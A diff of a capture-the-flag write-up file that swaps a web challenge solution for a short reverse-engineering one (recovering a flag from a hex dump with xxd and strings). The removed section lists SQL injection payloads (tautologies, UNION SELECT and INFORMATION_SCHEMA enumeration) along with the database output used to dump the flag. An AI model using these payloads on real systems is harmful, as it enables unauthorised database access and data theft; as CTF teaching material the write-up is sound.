@@ -1,127 +1,38 @@
-Message the Admin
+Mission Improbable
 ========
 
 > John Hammond | Monday, February 6th, 2017
 
 --------------------------------------------
 
-> Joker has left a message for you. Your job is to get to the message asap.
-> joking.bitsctf.bits-quark.org
+> Poor man's USB Rubber Ducky
+> 
+> Flag format: BITCTF{a1phanum3ric_w0rds}
+> //missed an S, too lazy to fix
+>  
 
+This was the first [reverse engineering] challenge, but it was hardly reversing.
 
-Another web challenge.
-
-Navigating to the webpage, we are greeted with a text entry box and a message in italics: _Get to the database_.
-
-It looked like we could query a database with that entry. 
-
-I entered id: `1` and received: 
+The file was all [hex], so I figured I could recreate the binary with [`xxd`][xxd]. 
 
 ```
-First name:Harry
-Surname: Potter
+xxd -r -p MissionImprobable.TEENSY31.hex > output
 ```
 
-OK, so we could get results. Now, can we test for [SQL injection]?
-
-I tried:
+I could see there was data in there, so I ran `strings` against it to see if there was any new contents, and I found some peculiar strings.
 
 ```
-1' OR '1'='1
+ "The flag is BI
+TCTF{B4d_bad_U5BO
 ```
 
-And I received the same result. Weird, if it was successful, it should have returned everything?
+With that I was able to piece together enough context clues to figure out this text `BITSCTF{B4d_bad_U5B0` could be the flag.
 
-I tried with a comment...
+I thought it was odd, though, that it didn't end with a `}` curly brace, and the zero seemed out of place, so I tried replacing it and submitting it.
 
-```
-1' OR '1'='1' #
-```
+And it took!
 
-That dumped everything.
-
-```
-First name:Harry
-Surname: Potter
-
-First name:Hermione
-Surname: Granger
-
-First name:Ronald
-Surname: Weasley
-
-First name:Joker
-Surname: Joker
-```
-
-Now to start the actual [SQL injection] process.
-
-I assumed the number of columns returned was 2 based off of the previous data we were receiving, so I rolled with that:
-
-```
-' UNION SELECT 1, 2 #
-```
-
-And that returned happily.
-
-```
-First name:1
-Surname: 2
-```
-
-At this point I whipped out my handy [SQL Injection Cheatsheet](https://github.com/USCGA/miscellaneous/blob/master/SQL_INJECTION_CHEATSHEET.md) and went to work.
-
-```
-' UNION SELECT (SELECT GROUP_CONCAT( SCHEMA_NAME ) FROM INFORMATION_SCHEMA.SCHEMATA), 2 #
-```
-
-Received:
-
-```
-First name:information_schema,hack,mysql,performance_schema
-Surname: 2
-```
-
-Hmm, the database `hack` looks peculiar...
-
-```
-' UNION SELECT (SELECT GROUP_CONCAT( TABLE_NAME ) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA="hack"), 2 #
-```
-
-And received:
-
-```
-First name:CIA_Official_Records,Joker
-Surname: 2
-```
-
-`Joker` looked new and not like what we were receiving earlier. And it is totally in line with the challenge title. Let's check that out:
-
-```
-' UNION SELECT (SELECT GROUP_CONCAT( COLUMN_NAME ) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME="Joker"), 2 #
-```
-
-And the database returned:
-
-```
-First name:Flag,HaHaHa
-Surname: 2
-```
-
-Aha! Let's check out that `Flag` field.
-
-```
-' UNION SELECT (SELECT GROUP_CONCAT( Flag ) FROM Joker), 2 #
-```
-
-And win!
-
-```
-First name:BITSCTF{wh4t_d03snt_k1ll_y0u_s1mply_m4k3s_y0u_str4ng3r!}
-Surname: 2
-```
-
-__The flag was: `BITSCTF{wh4t_d03snt_k1ll_y0u_s1mply_m4k3s_y0u_str4ng3r!}`__
+__The flag was: `BITSCTF{B4d_bad_U5B}`__
 
 [netcat]: https://en.wikipedia.org/wiki/Netcat
 [Wikipedia]: https://www.wikipedia.org/
@@ -471,3 +382,15 @@ __The flag was: `BITSCTF{wh4t_d03snt_k1ll_y0u_s1mply_m4k3s_y0u_str4ng3r!}`__
 [RGB color]: https://en.wikipedia.org/wiki/RGB_color_model
 [exiftool]: http://www.sno.phy.queensu.ca/~phil/exiftool/
 [robots.txt]: http://www.robotstxt.org/
+[XSS]: https://en.wikipedia.org/wiki/Cross-site_scripting
+[cross-site scripting]: https://en.wikipedia.org/wiki/Cross-site_scripting
+[cross site scripting]: https://en.wikipedia.org/wiki/Cross-site_scripting
+[cookie catcher]: http://hackwithstyle.blogspot.com/2011/11/what-is-cookie-catcher-and-how-to-get.html
+[johnhammond.org]: http://johnhammond.org
+[HTTP cookie]: https://en.wikipedia.org/wiki/HTTP_cookie
+[HTTP cookies]: https://en.wikipedia.org/wiki/HTTP_cookie
+[cookie]: https://en.wikipedia.org/wiki/HTTP_cookie
+[cookies]: https://en.wikipedia.org/wiki/HTTP_cookie
+[HTTP GET]: http://www.w3schools.com/Tags/ref_httpmethods.asp
+[tee]: https://en.wikipedia.org/wiki/Tee_(command)
+[reverse engineering]: https://en.wikipedia.org/wiki/Reverse_engineering
